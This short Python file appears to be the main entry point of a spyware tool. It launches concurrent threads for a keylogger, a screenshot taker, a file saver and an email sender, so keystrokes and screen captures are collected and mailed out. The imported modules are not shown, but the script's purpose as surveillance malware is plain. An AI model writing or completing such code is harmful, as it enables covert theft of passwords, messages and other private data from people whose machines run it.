
from threading import Thread


from keylogger import keyLogger
from takeScreenshot import takeSs
from saveFiles import saveFile
from sendMail import sendMails


if __name__ == '__main__':
    Thread(target=keyLogger).start()
    Thread(target=takeSs).start()
    Thread(target=saveFile).start()
    Thread(target=sendMails).start()
